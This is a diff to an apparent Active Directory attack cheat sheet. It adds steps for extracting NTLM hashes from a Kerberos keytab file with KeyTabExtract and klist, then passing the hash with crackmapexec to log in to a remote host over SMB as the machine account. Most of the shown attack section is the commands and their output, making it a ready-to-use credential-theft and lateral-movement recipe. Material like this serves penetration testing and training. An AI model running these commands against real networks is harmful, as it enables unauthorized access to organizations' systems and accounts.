@@ -1779,9 +1779,20 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [26] Service principal: host/COMPUTER@DOMAIN
 	 KVNO: 25
 	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+
+```powershell
+$ python3 keytabextract.py krb5.keytab 
+[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
+[+] Keytab File successfully imported.
+        REALM : DOMAIN
+        SERVICE PRINCIPAL : host/computer.domain
+        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
 On macOS you can use `bifrost`.
@@ -1793,12 +1804,9 @@ On macOS you can use `bifrost`.
 Connect to the machine using the account and the hash with CME.
 
 ```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
-
-
-
 
 ## References
 
